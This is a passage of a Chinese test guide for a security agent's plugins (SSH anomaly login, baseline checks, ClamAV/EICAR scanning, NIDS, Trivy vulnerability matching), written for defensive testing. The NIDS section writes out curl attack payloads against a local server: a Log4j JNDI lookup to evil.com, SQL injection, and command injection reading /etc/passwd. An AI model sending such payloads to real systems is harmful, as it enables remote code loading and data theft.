INFO  ssh/ssh_anomaly.go:51   SSH anomaly detector: compiled 2 IPs from 1 rules
INFO  detector/main.go:158    SSH anomaly login detector registered
INFO  ssh/ssh_anomaly.go:251  SSH anomaly detector config updated: 1 rules, 2 IPs indexed
```

**判定规则**：
- `compiled N IPs from M rules`（N > 0, M > 0）→ 规则加载成功
- `detector registered` → 检测器已注册
- `0 IPs from 0 rules` → 规则未生效，检查是否被服务端配置覆盖

#### 触发异常登录

从不在白名单中的 IP 成功登录 SSH。如果在本地测试，可通过本机实际 IP（非 `127.0.0.1`）登录：

```bash
# 查看本机 IP
hostname -I | awk '{print $1}'
# 假设为 10.107.12.99（不在白名单 192.168.1.100/101 中）

# 确保 SSH 密钥认证可用
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys 2>/dev/null
chmod 600 ~/.ssh/authorized_keys

# 通过本机 IP 登录（非 127.0.0.1，绕过白名单）
ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa root@10.107.12.99 "echo 'login success'"
```

等待 5-10 秒后查询远程数据库：

```sql
SELECT agent_id, host_ip, source_ip, source_location, login_user, login_time, risk_level, created_at
FROM alert_abnormal_login
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `source_ip` 为发起登录的 IP（不在白名单中）
- `login_user` 为登录的用户名
- `risk_level` 为 `critical`
- `login_time` 与实际登录时间一致

---

## 七、Baseline 插件测试

Baseline 插件需要通过 HTTP API 手动下发基线检查任务（DataType 8000），不再自动触发。

### 7.1 前置条件

确保远程数据库的 `baseline_template` 和 `baseline_check_item` 表中已导入测试数据（模板+检查项）。如果是全新数据库，需要先插入测试模板和检查项数据。

**数据关联关系：**

```
baseline_template (模板)            baseline_check_item (检查项)
┌──────────────────────┐           ┌───────────────────────────────┐
│ id=1 Linux系统安全基线 │──┐       │ baseline_id=1, 检查SSH协议版本  │
│ item_count=3          │  ├─────→│ baseline_id=1, 检查密码最大天数  │
│                       │  │       │ baseline_id=1, 检查passwd权限   │
└──────────────────────┘  │       └───────────────────────────────┘
                          │
┌──────────────────────┐  │       ┌───────────────────────────────┐
│ id=2 SSH加固基线      │──┤       │ baseline_id=2, 禁止root远程登录 │
│ item_count=2          │  ├─────→│ baseline_id=2, SSH空闲超时检查   │
└──────────────────────┘  │       └───────────────────────────────┘
                          │
┌──────────────────────┐  │       ┌───────────────────────────────┐
│ id=3 文件完整性基线    │──┘       │ baseline_id=3, 检查/tmp是否存在 │
│ item_count=2          │  ──────→│ baseline_id=3, 检查hosts文件权限│
└──────────────────────┘          └───────────────────────────────┘
```

> `baseline_check_item.baseline_id` 关联 `baseline_template.id`，一个模板下有多个检查项。
> 下发任务时 `template_id` 指定使用哪个模板，服务端自动加载该模板下所有检查项。

连接远程数据库执行以下 SQL：

```bash
PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc
```

**步骤一：插入测试模板（3 个模板）：**

```sql
-- 模板 1: Linux 系统安全基线（3 个检查项）
INSERT INTO baseline_template (id, baseline_name, baseline_type, os_type, version, item_count, description, is_enabled)
VALUES (1, 'Linux 系统安全基线', 'os_security', 'linux', '1.0', 3, 'Linux 系统安全合规检查（账户策略+文件权限+SSH）', 1);

-- 模板 2: SSH 加固基线（2 个检查项）
INSERT INTO baseline_template (id, baseline_name, baseline_type, os_type, version, item_count, description, is_enabled)
VALUES (2, 'SSH 加固基线', 'os_security', 'linux', '1.0', 2, 'SSH 服务安全加固检查', 1);

-- 模板 3: 文件完整性基线（2 个检查项）
INSERT INTO baseline_template (id, baseline_name, baseline_type, os_type, version, item_count, description, is_enabled)
VALUES (3, '文件完整性基线', 'os_security', 'linux', '1.0', 2, '关键文件存在性和权限检查', 1);
```

**步骤二：插入测试检查项（按模板分组，共 7 项）：**

检查项通过 `baseline_id` 关联所属模板，覆盖 agent 支持的主要检查类型。

```sql
-- ============================================================
-- 模板 1 的检查项（baseline_id=1，Linux 系统安全基线，共 3 项）
-- ============================================================

-- 1-1: command_check — 检查 SSH 协议版本
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (1, '确保SSH协议版本为2', '访问控制', 'high',
  '{"condition":"all","rules":[{"type":"command_check","param":["grep -i ''^Protocol'' /etc/ssh/sshd_config | awk ''{print $2}''"],"filter":"","require":"","result":"2"}]}',
  '编辑 /etc/ssh/sshd_config，设置 Protocol 2');

-- 1-2: file_line_check — 检查密码最大使用天数
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (1, '确保密码最大使用天数不超过90天', '账户策略', 'medium',
  '{"condition":"all","rules":[{"type":"file_line_check","param":["/etc/login.defs","PASS_MAX_DAYS"],"filter":"[0-9]+","require":"","result":"$(<=)90"}]}',
  '编辑 /etc/login.defs，设置 PASS_MAX_DAYS 90');

-- 1-3: file_permission — 检查 /etc/passwd 文件权限
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (1, '确保/etc/passwd权限为644或更严格', '文件权限', 'high',
  '{"condition":"all","rules":[{"type":"file_permission","param":["/etc/passwd"],"filter":"","require":"","result":"644"}]}',
  '执行 chmod 644 /etc/passwd');

-- ============================================================
-- 模板 2 的检查项（baseline_id=2，SSH 加固基线，共 2 项）
-- ============================================================

-- 2-1: command_check — 检查是否禁用root远程登录
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (2, '确保禁止root用户远程SSH登录', 'SSH加固', 'high',
  '{"condition":"all","rules":[{"type":"command_check","param":["grep -i ''^PermitRootLogin'' /etc/ssh/sshd_config | awk ''{print $2}''"],"filter":"","require":"","result":"no"}]}',
  '编辑 /etc/ssh/sshd_config，设置 PermitRootLogin no');

-- 2-2: command_check — 检查SSH空闲超时时间
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (2, '确保SSH空闲超时不超过300秒', 'SSH加固', 'medium',
  '{"condition":"all","rules":[{"type":"command_check","param":["grep -i ''^ClientAliveInterval'' /etc/ssh/sshd_config | awk ''{print $2}''"],"filter":"","require":"","result":"$(<=)300"}]}',
  '编辑 /etc/ssh/sshd_config，设置 ClientAliveInterval 300');

-- ============================================================
-- 模板 3 的检查项（baseline_id=3，文件完整性基线，共 2 项）
-- ============================================================

-- 3-1: if_file_exist — 检查 /tmp 目录是否存在
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (3, '确保/tmp目录存在', '文件完整性', 'low',
  '{"condition":"all","rules":[{"type":"if_file_exist","param":["/tmp"],"filter":"","require":"","result":true}]}',
  '执行 mkdir -p /tmp && chmod 1777 /tmp');

-- 3-2: file_permission — 检查 /etc/hosts 文件权限
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (3, '确保/etc/hosts权限为644', '文件完整性', 'medium',
  '{"condition":"all","rules":[{"type":"file_permission","param":["/etc/hosts"],"filter":"","require":"","result":"644"}]}',
  '执行 chmod 644 /etc/hosts');
```

> **check_rules JSON 格式说明：**
> - `condition`：规则间逻辑关系，`all`=全部通过、`any`=任一通过、`none`=全不通过
> - `rules[].type`：检查类型，支持 `command_check`（命令输出）、`file_line_check`（文件行匹配）、`file_permission`（文件权限）、`if_file_exist`（文件存在）、`file_user_group`（文件属主）、`file_md5_check`（MD5校验）
> - `rules[].param`：参数数组，通常为命令或文件路径
> - `rules[].filter`：正则过滤器，从结果中提取子串
> - `rules[].result`：期望值，支持字符串精确匹配、正则匹配、关系运算符（`$(<=)90`、`$(>=)1`）

**步骤三：验证关联关系：**

```sql
-- 查看所有模板
SELECT id, baseline_name, baseline_type, item_count, is_enabled
FROM baseline_template ORDER BY id;

-- 查看每个模板下的检查项数量（应与 item_count 一致）
SELECT t.id AS template_id, t.baseline_name, t.item_count,
       COUNT(i.id) AS actual_items
FROM baseline_template t
LEFT JOIN baseline_check_item i ON i.baseline_id = t.id
GROUP BY t.id, t.baseline_name, t.item_count
ORDER BY t.id;

-- 查看所有检查项及其所属模板
SELECT i.id, i.baseline_id AS template_id, t.baseline_name AS template_name,
       i.item_name, i.category, i.risk_level
FROM baseline_check_item i
JOIN baseline_template t ON t.id = i.baseline_id
ORDER BY i.baseline_id, i.id;
```

预期结果为模板 1 有 3 项、模板 2 有 2 项、模板 3 有 2 项，共 7 个检查项。确认无误后即可进行下一步。

### 7.2 手动下发基线检查任务

通过 curl 调用远程 server 的 `POST /api/baseline/check` 下发任务：

```bash
curl -X POST http://<REMOTE_IP>:8081/api/baseline/check \
  -H "Content-Type: application/json" \
  -d '{
    "agent_ids": ["<your_agent_id>"],
    "baseline_id": "test-task-001",
    "template_id": 1
  }'
```

参数说明：
- `agent_ids`：目标 agent 列表（必填）
- `baseline_id`：检测批次ID，即前端 task_id（string 类型）
- `template_id`：服务端基线模板 ID（必填，对应 `baseline_template.id`）

### 7.3 数据库验证

任务下发后等待 agent 执行完毕，查询远程数据库：

**基线检查结果：**

```sql
SELECT baseline_id, template_id, agent_id, host_ip, host_name,
       total_items, passed_items, failed_items, error_items, check_time
FROM baseline_check_result
WHERE agent_id = '<your_agent_id>'
ORDER BY created_at DESC LIMIT 5;
```

**检查项明细：**

```sql
SELECT d.result_id, d.item_id, d.item_name, d.agent_id,
       d.baseline_id, d.template_id, d.template_name,
       d.status, d.risk_level, d.actual_value, d.error_message
FROM baseline_check_detail d
WHERE d.agent_id = '<your_agent_id>'
ORDER BY d.created_at DESC LIMIT 20;
```

验证要点：
- `baseline_check_result` 有汇总记录，`total_items` > 0
- `baseline_check_result.baseline_id` 为下发时传入的 `"test-task-001"`（VARCHAR 类型）
- `baseline_check_result.template_id` 为下发时传入的模板 ID
- `baseline_check_detail` 有逐条检查明细
- `baseline_check_detail.template_name` 不为空（来自模板名称）
- `baseline_check_detail.template_id` 与 result 中一致
- `status` 字段为数字：0=未通过，1=通过，2=检查异常

---

## 八、Scanner 插件测试

Scanner 插件使用 ClamAV 引擎扫描文件系统，检测木马、Webshell、挖矿程序等恶意文件。检测结果写入 `alert_malware_scan` 表。

> 前提：ClamAV 开发库已安装（`apt install clamav libclamav-dev clamav-freshclam`），病毒库文件位于 `/var/lib/clamav/`（执行 `sudo freshclam` 下载）。

### 8.1 准备测试文件

Agent 连接后，server 会自动下发目录扫描任务（扫描 `/root`、`/etc`、`/var/www`）。在启动 Agent **之前**，先创建 EICAR 标准测试文件：

```bash
# 在自动扫描目录下创建 EICAR 测试文件
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /root/eicar_test.com
```

启动 Agent 后，约 5 秒后 server 自动下发扫描任务，Scanner 插件会扫描 `/root` 目录并检出该文件。

### 8.2 数据库验证

等待扫描完成后（约 30 秒）查询：

**恶意文件检测记录 (alert_malware_scan)：**

```sql
SELECT agent_id, host_ip, threat_type, file_name, file_path, file_size,
       file_md5, detection_engine, malware_family, scan_time, created_at
FROM alert_malware_scan
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

验证要点：
- `file_path` 为 `/root/eicar_test.com`
- `file_md5` 为 `44d88612fea8a8f36de82e1278abb02f`（EICAR 标准 MD5）
- `detection_engine` 为 `ClamAV`
- `threat_type` 非空

### 8.3 多文件批量检测

```bash
# 创建多个测试文件（在自动扫描目录下）
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /root/eicar_1.exe
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /root/eicar_2.sh
```

重启 Agent 触发自动扫描后查询：

```sql
-- 验证检测数量
SELECT COUNT(*) FROM alert_malware_scan
WHERE agent_id = '123456' AND file_path LIKE '/root/eicar%';
```

验证要点：检测记录数 >= 3（eicar_test.com + eicar_1.exe + eicar_2.sh）

### 8.4 清理测试文件

```bash
rm -f /root/eicar_test.com /root/eicar_1.exe /root/eicar_2.sh
```

---

## 九、NIDS 插件测试

NIDS 插件通过 gopacket 抓取网卡流量，解析 HTTP 请求后与 Suricata 格式规则匹配，检测结果写入 `alert_network_attack` 表。

> 前提：libpcap 已安装，Nginx 运行在本地 80 端口，nids 配置抓取对应网卡接口。

### 9.1 触发网络攻击检测

在另一个终端执行攻击模拟请求（目标为本地 Nginx）：

```bash
# 终端 B：Log4j2 JNDI 注入（SID 1001, critical）
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/

# SQL 注入 UNION SELECT（SID 2001, high）
curl -s -o /dev/null 'http://127.0.0.1/api?id=1%20UNION%20SELECT%201,2,3'

# 命令注入（SID 3001, critical）
curl -s -o /dev/null 'http://127.0.0.1/api?cmd=%3bcat%20/etc/passwd'

# SQLMap 扫描器 UA（SID 6001, medium）
curl -s -o /dev/null -A 'sqlmap/1.0' http://127.0.0.1/
```

> **重要：** NIDS 通过 gopacket 抓取**本地网卡**流量，curl 目标必须为本地地址（`127.0.0.1` 或本机 IP），不能使用远程服务器 IP。

### 9.2 数据库验证

等待 5-10 秒后查询：

**网络攻击告警 (alert_network_attack)：**

```sql
SELECT agent_id, host_ip, attacker_ip, target_port, vulnerability_name,
       attack_count, attack_payload, first_attack_time, last_attack_time, created_at
FROM alert_network_attack
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

验证要点：
- 至少有 4 条记录（对应上述 4 条 curl 请求）
- `target_port` 为 `80`
- `vulnerability_name` 包含对应的规则描述（如 `Log4j2`、`SQL Injection` 等）

### 9.3 重复攻击计数验证

```bash
# 终端 B：连续发送 3 次相同攻击
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
```

```sql
SELECT vulnerability_name, attack_count, first_attack_time, last_attack_time
FROM alert_network_attack
WHERE agent_id = '123456' AND vulnerability_name LIKE '%Log4j2%'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：`attack_count` 随重复攻击递增

---

## 十、主机漏洞检测测试

server 内置漏洞匹配模块，基于 Trivy 漏洞数据库，将 Agent 采集到的主机软件包（`asset_software`, DataType 5055）与已知 CVE 进行版本比对，自动发现存在漏洞的软件包。匹配过程完全在 server 服务端执行，Agent 只负责采集软件包数据。

### 10.1 前置条件

1. **Trivy 漏洞数据库**：远程 server 启动时会自动从 OCI 仓库下载 Trivy DB（首次下载约 40MB），需确保远程服务器可访问 `ghcr.io`。

   可在远程服务器上验证：

   ```bash
   curl -sI https://ghcr.io/v2/ | head -1
   # 预期: HTTP/2 401（能到达即可，不需要认证）
   ```

   > 如果远程服务器网络不通，可在有网络的机器上手动下载 Trivy DB 文件，然后拷贝 `trivy.db` 和 `metadata.json` 到远程服务器的 `/opt/cloudsec/data/trivy-db/db/` 目录下。

2. **远程 server.yaml 漏洞模块配置**：确认远程 server 的 `vuln.enabled` 为 `true`（默认已启用）。

   ```yaml
   vuln:
     enabled: true
     db_dir: /opt/cloudsec/data/trivy-db
     db_repository: "ghcr.io/aquasecurity/trivy-db:2"
     update_interval: 24
     scan_cron: "0 2 * * *"
   ```

3. **软件包采集任务已配置**：确认远程 server.yaml 的 `tasks` 中包含 DataType 5055（默认已配置）。

### 10.2 测试流程

主机漏洞检测为全自动流程，无需手动触发：

1. 远程 server 启动 → 漏洞模块初始化，下载/打开 Trivy DB
2. 本地启动 Agent → Collector 采集主机软件包写入远程数据库 `asset_software`
3. 远程 server 启动约 **30 秒**后自动执行首次漏洞匹配
4. 匹配引擎读取 `asset_software` 中 dpkg/rpm 类型的软件包 → 逐包查询 Trivy DB → 将结果写入 `host_vuln_detail`

**远程 server 日志观察**（需登录远程服务器查看）：

```
# 漏洞模块初始化
INFO  [VulnDB] 漏洞数据库初始化成功: /opt/cloudsec/data/trivy-db/db/trivy.db
INFO  [VulnScheduler] 调度器已启动，匹配间隔: 24h0m0s

# 首次匹配（启动约 30 秒后）
INFO  [VulnScheduler] 开始执行漏洞匹配任务...
INFO  [VulnScheduler] 开始匹配 1 台主机的漏洞...
INFO  [Matcher] 开始匹配主机漏洞: agent=123456, host=xxx, source=ubuntu 22.04, packages=xxx
INFO  [Matcher] 主机发现 N 个漏洞: agent=123456
INFO  [VulnScheduler] 漏洞匹配任务完成: 耗时=Xs, 主机=1(发现N个漏洞), 镜像=0(发现0个漏洞)
```

**判定规则**：
- `漏洞数据库初始化成功` 出现 → Trivy DB 就绪
- `调度器已启动` 出现 → 漏洞匹配调度器正常启动
- `漏洞匹配任务完成` 出现 → 首次匹配已执行
- 如果出现 `漏洞数据库初始化失败` → 检查远程服务器网络是否可访问 `ghcr.io`，或手动下载 Trivy DB

### 10.3 数据库验证

等待首次匹配完成后（远程 server 日志出现 `漏洞匹配任务完成`），查询远程数据库。

```bash
PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc
```

**主机漏洞扫描任务 (host_vuln_scan_task)：**

```sql
SELECT id, agent_id, host_name, host_ip, scan_status, scan_trigger,
       total_packages, matched_vulns, scan_duration, scan_time
FROM host_vuln_scan_task
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `scan_status` 为 `1`（成功）。`0`=进行中，`2`=失败
- `scan_trigger` 为 `auto`
- `total_packages` > 0（与 `asset_software` 中 dpkg/rpm 包数量一致）
- `matched_vulns` >= 0（实际漏洞数取决于系统软件版本）
- `scan_duration` 非空（匹配耗时，单位毫秒）

**漏洞信息 (vuln_info)：**

```sql
SELECT cve_id, vuln_name, severity, cvss_score
FROM vuln_info
ORDER BY cvss_score DESC NULLS LAST
LIMIT 10;
```

验证要点：
- `cve_id` 格式为 `CVE-YYYY-NNNNN`
- `severity` 为 `critical`/`high`/`medium`/`low` 之一
- `cvss_score` 在 0.0-10.0 范围内

**主机漏洞详情 (host_vuln_detail)：**

```sql
SELECT cve_id, package_name, installed_version, fixed_version,
       severity, cvss_score, status, scan_time
FROM host_vuln_detail
WHERE agent_id = '123456'
ORDER BY cvss_score DESC NULLS LAST
LIMIT 10;
```

验证要点：
- `package_name` 对应系统中实际安装的软件包
- `installed_version` 为当前安装版本
- `fixed_version` 为修复版本（可能为空，表示尚无修复版本）
- `status` 为 `0`（未修复）
- 每条记录的 `cve_id` 在 `vuln_info` 表中有对应条目

**按等级统计：**

```sql
SELECT severity, COUNT(*) AS vuln_count
FROM host_vuln_detail
WHERE agent_id = '123456'
GROUP BY severity
ORDER BY
  CASE severity
    WHEN 'critical' THEN 1
    WHEN 'high' THEN 2
    WHEN 'medium' THEN 3
    WHEN 'low' THEN 4
  END;
```

### 10.4 HTTP API 验证

漏洞数据也可通过远程 server HTTP API 查询。

**主机漏洞统计列表：**

```bash
curl -s 'http://<REMOTE_IP>:8081/api1/vulns/host/stats?page=1&page_size=10' | python3 -m json.tool
```

**漏洞视角 — 漏洞主机统计：**

```bash
curl -s 'http://<REMOTE_IP>:8081/api1/vulns/vul/hostscount?page=1&page_size=10' | python3 -m json.tool
```

**主机漏洞详情列表：**

```bash
curl -s 'http://<REMOTE_IP>:8081/api1/vulns/hostdetail/counts?page=1&page_size=10' | python3 -m json.tool
```

---

## 十一、容器漏洞检测测试

容器漏洞检测与主机漏洞使用相同的 Trivy 匹配引擎，但数据来源不同：Agent 通过 `docker exec` 进入运行中的容器，枚举容器内已安装的软件包（`asset_image_package`, DataType 5059），server 据此进行漏洞匹配。

### 数据流

```
Collector Plugin                  远程 server Server                  远程 PostgreSQL
┌──────────────────┐  gRPC       ┌─────────────────┐  UPSERT        ┌──────────────────────┐
│ ImageHandler      │───────────→│ transfer.go      │──────────────→ │ asset_image          │
│ (DataType 5058)   │            └─────────────────┘                │ (镜像基本信息)       │
├──────────────────┤             ┌─────────────────┐                ├──────────────────────┤
│ImagePackageHandler│───────────→│ transfer.go      │──────────────→ │ asset_image_package  │
│ (DataType 5059)   │            └─────────────────┘                │ (镜像内软件包)       │
└──────────────────┘                                                └──────────┬───────────┘
    本地机器                                                                    │ 读取
                                 ┌─────────────────┐                ┌──────────▼───────────┐
                                 │ VulnScheduler    │  查询 CVE      │ Trivy BoltDB         │
                                 │ matchAllImages() │───────────────→│ (漏洞数据库)         │
                                 └────────┬────────┘                └──────────────────────┘
                                          │ 写入匹配结果
                                 ┌────────▼────────────────┐
                                 │ vuln_info               │
                                 │ image_vuln_scan_task    │
                                 │ image_vuln_detail       │
                                 └─────────────────────────┘
                                    远程服务器 <REMOTE_IP>
```

### 11.1 前置条件

在主机漏洞检测前置条件（10.1）基础上，还需要：

1. **本地 Docker 已安装且有运行中的容器**（参见 4.1 容器资产采集准备）。

2. **远程 server.yaml 中启用镜像和镜像软件包采集任务**：默认 `tasks` 中**未配置** DataType 5058 和 5059，需在远程服务器上手动添加。

   在远程 server 的 `server.yaml` 的 `tasks` 列表末尾追加：

   ```yaml
   tasks:
     # ... 已有的任务配置 ...
     - object_name: collector
       data_type: 5058  # 镜像
     - object_name: collector
       data_type: 5059  # 镜像软件包
   ```

   > **重要**：修改后需重启远程 server 和本地 Agent 使配置生效。

3. **启动含已知漏洞的容器**（推荐，可产生更多匹配结果）：

   ```bash
   # 方式一：使用较旧版本的 Debian（含已知漏洞的旧软件包）
   docker run -d --name test-debian-old debian:bullseye sleep 3600

   # 方式二：使用 Alpine 旧版本
   docker run -d --name test-alpine-old alpine:3.16 sleep 3600

   # 验证容器运行
   docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"
   ```

   > **提示**：使用旧版本镜像可以确保 Trivy 漏洞库中有对应的 CVE 匹配，验证效果更明显。`alpine:latest` 等最新镜像可能漏洞较少。

### 11.2 测试流程

1. 确保远程 server.yaml 已添加 5058 和 5059 任务配置
2. 本地启动测试容器（参见 11.1 步骤 3）
3. 远程 server 启动 → 漏洞模块初始化
4. 本地启动 Agent → Collector 采集镜像信息和镜像内软件包
5. 远程 server 启动约 **30 秒**后自动执行漏洞匹配（含镜像匹配）

**本地 Agent 日志观察**（Terminal A）：

```
# 镜像软件包采集成功时会输出
INFO  collector  Image package collection: image=debian:bullseye os=debian 11 type=dpkg packages=xxx
```

**远程 server 日志观察**（需登录远程服务器查看）：

```
# 镜像漏洞匹配
INFO  [VulnScheduler] 开始匹配 N 个镜像的漏洞...
INFO  [Matcher] 开始匹配镜像漏洞: agent=123456, image=debian:bullseye, source=debian 11, packages=xxx
INFO  [Matcher] 镜像发现 N 个漏洞: image=debian:bullseye
INFO  [VulnScheduler] 漏洞匹配任务完成: 耗时=Xs, 主机=1(发现N个漏洞), 镜像=1(发现N个漏洞)
```

**判定规则**：
- Agent 日志出现 `Image package collection` → 镜像软件包采集成功
- server 日志 `镜像=0` → 无镜像数据，检查 5058/5059 是否已配置、容器是否在运行
- server 日志 `镜像OS版本信息缺失，跳过` → `asset_image_package.os_version` 为空，需排查

### 11.3 数据库验证 — 资产采集

先确认镜像资产和软件包已正确写入远程数据库。

```bash
PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc
```

**镜像资产 (asset_image)：**

```sql
SELECT image_id, image_name, image_version, image_size
FROM asset_image WHERE agent_id = '123456';
```

**镜像软件包 (asset_image_package)：**

```sql
-- 查看各镜像的软件包数量
SELECT image_name, package_type, os_version, COUNT(*) AS pkg_count
FROM asset_image_package
WHERE agent_id = '123456'
GROUP BY image_name, package_type, os_version;

-- 查看具体软件包
SELECT image_name, package_name, package_version, package_type, os_version
FROM asset_image_package
WHERE agent_id = '123456'
ORDER BY image_name, package_name
LIMIT 20;
```

验证要点：
- 每个运行中容器对应的镜像应有软件包记录
- `package_type` 为 `dpkg`（Debian/Ubuntu）、`rpm`（CentOS）或 `apk`（Alpine）
- `os_version` 非空（如 `debian 11`、`alpine 3.16`）
- 软件包数量与容器内实际包数量一致（可通过 `docker exec test-debian-old dpkg -l | wc -l` 对比）

### 11.4 数据库验证 — 漏洞匹配结果

**镜像漏洞扫描任务 (image_vuln_scan_task)：**

```sql
SELECT id, agent_id, image_id, image_name, scan_status, scan_trigger,
       total_packages, matched_vulns, scan_duration, scan_time
FROM image_vuln_scan_task
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `scan_status` 为 `1`（成功）。`0`=进行中，`2`=失败
- `image_name` 对应测试容器的镜像
- `total_packages` > 0
- `matched_vulns` >= 0（旧版镜像通常会有漏洞匹配）

**镜像漏洞详情 (image_vuln_detail)：**

```sql
SELECT image_name, cve_id, package_name,
       installed_version, fixed_version,
       severity, cvss_score, status
FROM image_vuln_detail
WHERE agent_id = '123456'
ORDER BY cvss_score DESC NULLS LAST
LIMIT 10;
```

验证要点：
- `image_name` 对应测试容器的镜像
- `package_name` 为容器内实际存在的软件包
- `severity` 为 `critical`/`high`/`medium`/`low` 之一
- `status` 为 `0`（未修复）

**按镜像和等级统计：**

```sql
SELECT image_name, severity, COUNT(*) AS vuln_count
FROM image_vuln_detail
WHERE agent_id = '123456'
GROUP BY image_name, severity
ORDER BY image_name,
  CASE severity
    WHEN 'critical' THEN 1
    WHEN 'high' THEN 2
    WHEN 'medium' THEN 3
    WHEN 'low' THEN 4
  END;
```

### 11.5 HTTP API 验证

**镜像漏洞统计列表：**

```bash
curl -s 'http://<REMOTE_IP>:8081/api1/vulns/image/imagecount?page=1&page_size=10' | python3 -m json.tool
```

**镜像漏洞详情列表：**

```bash
curl -s 'http://<REMOTE_IP>:8081/api1/vulns/image/details?page=1&page_size=10' | python3 -m json.tool
```

**镜像漏洞视角统计：**

```bash
curl -s 'http://<REMOTE_IP>:8081/api1/vulns/imagevul/vulcounts?page=1&page_size=10' | python3 -m json.tool
```

### 11.6 清理测试容器

```bash
docker rm -f test-debian-old test-alpine-old 2>/dev/null
```

---

## 十二、完整验证脚本

以下脚本一次性验证所有关键表的数据写入情况（含 scanner 和 nids），连接远程数据库后执行：

```bash
# 连接远程数据库
PGPASSWORD=<DB_PASS> psql -h <REMOTE_IP> -p 5432 -U <DB_USER> -d soc
```

```sql
-- ========== Agent 连接状态 ==========
SELECT '=== agent_info ===' AS section;
SELECT agent_id, host_name, host_ip, connection_status, agent_version,
       last_connected_at
FROM agent_info WHERE agent_id = '123456';

-- ========== Collector 资产数据 ==========
SELECT '=== Asset Summary ===' AS section;
SELECT
    (SELECT COUNT(*) FROM asset_process WHERE agent_id = '123456') AS process_count,
    (SELECT COUNT(*) FROM asset_port WHERE agent_id = '123456') AS port_count,
    (SELECT COUNT(*) FROM asset_account WHERE agent_id = '123456') AS account_count,
    (SELECT COUNT(*) FROM asset_system_service WHERE agent_id = '123456') AS service_count,
    (SELECT COUNT(*) FROM asset_software WHERE agent_id = '123456') AS software_count,
    (SELECT COUNT(*) FROM asset_kmod WHERE agent_id = '123456') AS kmod_count,
    (SELECT COUNT(*) FROM asset_container WHERE agent_id = '123456') AS container_count,
    (SELECT COUNT(*) FROM asset_image WHERE agent_id = '123456') AS image_count;

-- ========== eBPF 事件数据 ==========
SELECT '=== Event Summary ===' AS section;
SELECT
    (SELECT COUNT(*) FROM event_execve WHERE agent_id = '123456') AS execve_count,
    (SELECT COUNT(*) FROM event_connect WHERE agent_id = '123456') AS connect_count,
    (SELECT COUNT(*) FROM event_dns WHERE agent_id = '123456') AS dns_count,
    (SELECT COUNT(*) FROM event_file WHERE agent_id = '123456') AS file_count;

-- ========== 告警数据 ==========
SELECT '=== Alert Summary ===' AS section;
SELECT
    (SELECT COUNT(*) FROM alert_brute_force WHERE agent_id = '123456') AS brute_force_count,
    (SELECT COUNT(*) FROM alert_dangerous_command WHERE agent_id = '123456') AS dangerous_cmd_count,
    (SELECT COUNT(*) FROM alert_privilege_escalation WHERE agent_id = '123456') AS privesc_count,
    (SELECT COUNT(*) FROM alert_reverse_shell WHERE agent_id = '123456') AS reverse_shell_count,
    (SELECT COUNT(*) FROM alert_abnormal_login WHERE agent_id = '123456') AS abnormal_login_count,
    (SELECT COUNT(*) FROM alert_malicious_request WHERE agent_id = '123456') AS malicious_request_count,
    (SELECT COUNT(*) FROM alert_file_integrity WHERE agent_id = '123456') AS file_integrity_count,
    (SELECT COUNT(*) FROM alert_malware_scan WHERE agent_id = '123456') AS malware_scan_count,
    (SELECT COUNT(*) FROM alert_network_attack WHERE agent_id = '123456') AS network_attack_count,
    (SELECT COUNT(*) FROM alert_container_dangerous_command WHERE agent_id = '123456') AS container_cmd_count,
    (SELECT COUNT(*) FROM alert_container_reverse_shell WHERE agent_id = '123456') AS container_revshell_count;

-- ========== Baseline 数据 ==========
SELECT '=== Baseline Summary ===' AS section;
SELECT
    (SELECT COUNT(*) FROM baseline_check_result WHERE agent_id = '123456') AS result_count,
    (SELECT COUNT(*) FROM baseline_check_detail WHERE agent_id = '123456') AS detail_count;
```

### 预期结果

**Agent 状态：**

| 数据类别 | 预期 | 说明 |
|---------|------|------|
| agent_info | 1 条，connection_status=1 | Agent 在线 |

**Collector 资产数据：**

| 数据类别 | 预期 | 说明 |
|---------|------|------|
| asset_process | > 50 条 | 系统进程数 |
| asset_port | > 0 条 | 监听端口数 |
| asset_account | > 0 条 | 系统用户数 |
| asset_system_service | > 0 条 | systemd 服务数 |
| asset_software | > 0 条 | 安装软件包数 |
| asset_kmod | > 0 条 | 内核模块数 |
| asset_container | > 0 条 | 需要有运行中的容器 |
